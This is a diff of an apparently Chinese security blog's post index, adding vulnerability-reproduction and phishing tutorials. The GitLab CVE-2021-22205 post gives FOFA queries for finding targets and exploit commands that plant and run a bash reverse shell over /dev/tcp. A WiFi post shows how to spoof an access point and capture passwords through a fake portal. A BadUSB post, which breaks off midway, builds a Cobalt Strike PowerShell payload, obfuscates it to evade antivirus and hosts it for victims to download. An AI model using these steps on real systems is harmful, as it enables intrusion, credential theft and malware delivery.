@@ -128,44 +128,6 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
       </tags>
   </entry>
   <entry>
-    <title>【CVE-2021-22205】GitLab 远程命令执行漏洞复现</title>
-    <url>/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;GitLab&quot;
-app&#x3D;&quot;GitLab&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<a id="more"></a>
-
-<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。<br>由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。<br><strong>根本原因</strong><br>1.当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。<br>2.其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。</p>
-<p>Gitlab链接：<br><a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/">https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/</a></p>
-<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：9.9 | 高危</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>11.9 &lt;= Gitlab CE/EE &lt; 13.8.8<br>12.13.9 &lt;= Gitlab CE/EE &lt; 13.9.6<br>13.13.10 &lt;= Gitlab CE/EE &lt; 13.10.3</p>
-<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/RedTeamWing/CVE-2021-22205">https://github.com/RedTeamWing/CVE-2021-22205</a><br><a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="证明存在"><a href="#证明存在" class="headerlink" title="证明存在"></a>证明存在</h4><p>先修改PoC里面的dnslog地址为自己的<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>利用PoC，我这里用的是pocsuite3测试框架<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>发现自己的dnslog有回显，证明利用成功，该站存在此漏洞<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
-<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里利用的是前面的第二个PoC</p>
-<pre class="line-numbers language-none"><code class="language-none">反弹shell：
-
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，对写入成功的sh脚本加执行权限
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p>相关用户可通过版本检测的方法判断当前应用是否存在风险。<br>使用如下命令可查看当前GitLab的版本：</p>
-<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"></p>
-<h4 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h4><p>目前官方已发布新版本修复了该漏洞，请受影响的用户尽快升级至最新版本进行防护，官方下载链接如下：<a href="https://about.gitlab.com/update/">https://about.gitlab.com/update/</a></p>
-<h4 id="临时防护措施"><a href="#临时防护措施" class="headerlink" title="临时防护措施"></a>临时防护措施</h4><p>若相关用户暂时无法进行升级操作，可使用白名单限制对Web端口的访问。配置访问控制策略，避免受影响的GitLab暴露在公网</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/cn-gov/p/15490588.html">https://www.cnblogs.com/cn-gov/p/15490588.html</a><br><a href="https://zhuanlan.zhihu.com/p/426847373">https://zhuanlan.zhihu.com/p/426847373</a><br><a href="https://www.cnblogs.com/ybit/p/14918949.html">https://www.cnblogs.com/ybit/p/14918949.html</a><br><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.11</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【Apache】Apache Solr任意文件读取漏洞复现</title>
     <url>/2021/05/05/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Solr&quot; || app&#x3D;&quot;&quot;Apache-Solr&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -332,6 +294,227 @@ stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow<span aria-hidden="true" c
       </categories>
       <tags>
         <tag>2021.1</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【CVE-2021-22205】GitLab 远程命令执行漏洞复现</title>
+    <url>/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;GitLab&quot;
+app&#x3D;&quot;GitLab&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<a id="more"></a>
+
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。<br>由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。<br><strong>根本原因</strong><br>1.当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。<br>2.其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。</p>
+<p>Gitlab链接：<br><a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/">https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/</a></p>
+<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：9.9 | 高危</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>11.9 &lt;= Gitlab CE/EE &lt; 13.8.8<br>12.13.9 &lt;= Gitlab CE/EE &lt; 13.9.6<br>13.13.10 &lt;= Gitlab CE/EE &lt; 13.10.3</p>
+<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/RedTeamWing/CVE-2021-22205">https://github.com/RedTeamWing/CVE-2021-22205</a><br><a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="证明存在"><a href="#证明存在" class="headerlink" title="证明存在"></a>证明存在</h4><p>先修改PoC里面的dnslog地址为自己的<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>利用PoC，我这里用的是pocsuite3测试框架<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>发现自己的dnslog有回显，证明利用成功，该站存在此漏洞<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里利用的是前面的第二个PoC</p>
+<pre class="line-numbers language-none"><code class="language-none">反弹shell：
+
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，对写入成功的sh脚本加执行权限
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p>相关用户可通过版本检测的方法判断当前应用是否存在风险。<br>使用如下命令可查看当前GitLab的版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"></p>
+<h4 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h4><p>目前官方已发布新版本修复了该漏洞，请受影响的用户尽快升级至最新版本进行防护，官方下载链接如下：<a href="https://about.gitlab.com/update/">https://about.gitlab.com/update/</a></p>
+<h4 id="临时防护措施"><a href="#临时防护措施" class="headerlink" title="临时防护措施"></a>临时防护措施</h4><p>若相关用户暂时无法进行升级操作，可使用白名单限制对Web端口的访问。配置访问控制策略，避免受影响的GitLab暴露在公网</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/cn-gov/p/15490588.html">https://www.cnblogs.com/cn-gov/p/15490588.html</a><br><a href="https://zhuanlan.zhihu.com/p/426847373">https://zhuanlan.zhihu.com/p/426847373</a><br><a href="https://www.cnblogs.com/ybit/p/14918949.html">https://www.cnblogs.com/ybit/p/14918949.html</a><br><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.11</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackDemo钓鱼篇①——WiFi钓鱼</title>
+    <url>/2022/06/01/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/</url>
+    <content><![CDATA[<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>如今的生活中社工攻击屡见不鲜，其中钓鱼是最为有效而且危害最大的一种攻击手法。攻击者常会伪装成官方、管理员或上级领导向受害者发送信息核实的请求，一旦受害者粗心大意接受了此类请求，其个人信息就会存在泄露的风险。本篇将以一个简单的HackDemo为例子，复现黑客在WiFi钓鱼中的惯用思路，供大家学习和参考。</p>
+<a id="more"></a>
+
+<h3 id="实现工具"><a href="#实现工具" class="headerlink" title="实现工具"></a>实现工具</h3><ul>
+<li><p>Esp8266开发板CH340</p>
+</li>
+<li><p>flash_download_tools_v3.6.5烧录软件</p>
+</li>
+<li><p>DNS.ino.ino.nodemcu.bin烧录文件</p>
+</li>
+<li><p>Arduino IDE_v1.8.5</p>
+</li>
+<li><p>ESP8266 Sketch Data Upload插件</p>
+<p>链接：<a href="https://pan.baidu.com/s/1l7Z7BLVOLnfumrx4GRPVDQ">https://pan.baidu.com/s/1l7Z7BLVOLnfumrx4GRPVDQ</a><br>提取码：2jp2</p>
+</li>
+</ul>
+<h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>连接好Esp8266开发板，在设备管理器中可以查看到对应的端口，如果没有识别需要安装一下驱动(CH341SER.EXE)，默认下一步即可。<br><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/1.png" alt="图片"></p>
+<p>打开flash_download_tools_v3.6.5.exe对开发板进行烧录，点击选择ESP8266 DownloadTool</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/2.png" alt="图片"></p>
+<p>载入DNS.ino.ino.nodemcu.bin文件，选择80MHz、QIO、32Mbit、[对应的端口]、1152000，然后点击START进行烧录，等进度条跑完</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/3.png" alt="图片"></p>
+<p>这时我们发现有一个名字是HH的新wifi，如果没有可以尝试将开发板重新拔插一下。</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/4.png" alt="图片"></p>
+<p>接下来安装Arduino，将工具包中tools目录下的内容拷贝到安装好的Arduino下的tools目录，可以发现在工具栏中多了两个插件。选择工具-&gt;开发板:”Arduino/Genuino Uno”-&gt;开发板管理器</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/8.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/5.png" alt="图片"></p>
+<p>在搜索框输入esp，选择下面的这个安装2.2.0版本</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/6.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/7.png" alt="图片"></p>
+<p>新建一个文件，保存到一个路径，然后点击工具-&gt;ESP8266 Sketch Data Upload，弹窗选择否，可以看到保存的文件目录下生成了data文件夹，我们将工具包里data目录下的三个html文件拷贝到生成的data文件夹里</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/9.png" alt="图片"></p>
+<p>选择工具栏下的开发板信息(按照自己的设备配置)，然后再次点击ESP8266 Sketch Data Upload</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/10.png" alt="图片"></p>
+<p>这个过程可能会进行1-2分钟，过程中开发板上的灯光长亮，等灯光熄灭就完成了</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/17.png" alt="图片"></p>
+<p>完成以后，连接HH，密码为m1234567，如果没有找到可以尝试重新拔插一下开发板或者重开一下电脑的wifi，连接上访问127.0.0.1/backdoor.html，这是钓鱼的后台，可以看到列出了附近的所有wifi，我们选择通用型，输入想要伪造的wifi序号，点击确认。</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/11.png" alt="图片"></p>
+<p>跳转到提示SSID伪造成功</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/12.png" alt="图片"></p>
+<p>我们连接伪造的这个wifi，没有密码，自动跳转到钓鱼页面，如果受害者安全意识不强可能会填写管理员密码，至此鱼就上钩了。</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/13.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/14.png" alt="图片"></p>
+<p>受害者点击开始升级会跳转到一个进度条，这些都没什么用，只是给受害者看的。攻击者可以在backdoor看到钓到的密码，至此整个wifi钓鱼成功！</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/15.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/16.png" alt="图片"></p>
+<p>小伙伴们还是要抱着练习的态度进行复现哦，以防走火入魔！</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.bilibili.com/video/BV1tU4y137yi?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1tU4y137yi?spm_id_from=333.999.0.0</a></p>
+]]></content>
+      <categories>
+        <category>社工安全</category>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>2022.6</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackDemo钓鱼篇②——U盘钓鱼</title>
+    <url>/2022/06/10/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/</url>
+    <content><![CDATA[<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>最近接触到各种钓鱼方法，研究到U盘钓鱼的时候，决定搞个BadUSB玩玩。BadUSB 漏洞是由安全研究人员Karsten Nohl 和 Jakob Lell 在 2014 年黑帽会议上首次发现并暴露出来的，这也就让USB安全和几乎所有和USB相关的设备（包括具有USB端口的电脑）都陷入相当危险的状态。</p>
+<p>就狭义来说，BadUSB是指形似 U 盘的设备，内部的电路在上电之后会被系统识别为键盘，此时该设备内部的芯片开始与电脑进行键盘通讯，仿照人的输入习惯，来操作电脑，以此达到骇入电脑的目的。</p>
+<p>就广义来说，BadUSB是指一切会被电脑识别为 HID 设备的，外观却不像键盘的电子设备。现阶段有的 BadUSB是形似数据线的，有的则是手机加定制内核，以发挥 BadUSB 的作用，更有甚者，将 BadUSB 开发为模块，可以嵌入任意的带 USB 接口的设备中。</p>
+<a id="more"></a>
+
+<h3 id="实现工具及环境"><a href="#实现工具及环境" class="headerlink" title="实现工具及环境"></a>实现工具及环境</h3><ul>
+<li><p>BadUSB Leonardo开发板</p>
+</li>
+<li><p>Arduino IDE_v1.8.5</p>
+</li>
+<li><p>Cobalt Strike 4.0</p>
+</li>
+<li><p>Server酱</p>
+</li>
+<li><p>Ubuntu 20.04.4(CS服务端、木马服务器)、Windows10(CS客户端)、Windows10(受害者)</p>
+<p>链接：<a href="https://pan.baidu.com/s/1UQI9GldqY8T3CIRrmDy7Pw">https://pan.baidu.com/s/1UQI9GldqY8T3CIRrmDy7Pw</a><br>提取码：r1c4</p>
+</li>
+</ul>
+<h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><p>Cobalt Strike启动服务端</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;teamserver xxx.xxx.xxx 123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/1.png" alt="图片"></p>
+<p>Cobalt Strike客户端登录，添加监听器</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/2.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/3.png" alt="图片"></p>
+<p>受害机为Windows系统，对于exe的木马会比较敏感，所以我们生成powershell的木马</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/4.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/5.png" alt="图片"></p>
+<p>保存在桌面命名为payload.ps1，需要对这个马做一下免杀，PowerShell的免杀可以用Invoke-Obfuscation，进入目录执行powershell命令</p>
+<pre class="line-numbers language-none"><code class="language-none">set-executionpolicy remotesigned
+Import-Module .\Invoke-Obfuscation.psd1
+Invoke-Obfuscation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/6.png" alt="图片"></p>
+<p>然后执行命令，指定待处理的Ps1文件</p>
+<p>或者指定待处理的ps代码</p>
+<pre class="line-numbers language-none"><code class="language-none">set scriptpath c:\xxx\payload.ps1
+set scriptblock &#39;echo xss&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>输入encoding 并选择编码方式，比如1，这里我选择混淆两次ascii 按两次1两次回车就完事儿了</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/7.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/8.png" alt="图片"></p>
+<p>导出免杀ps文件到指定路径</p>
+<pre class="line-numbers language-none"><code class="language-none">out C:\xxx\xxx.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>到这里简单的免杀完成了，将这个马放到远程服务器上备用，我们可以用以下命令启动内置的Apache服务器，使受害者可以下载木马。访问可以看到服务器上的马</p>
+<pre class="line-numbers language-none"><code class="language-none">python -m SimpleHTTPServer 9899<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/9.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/10.png" alt="图片"></p>
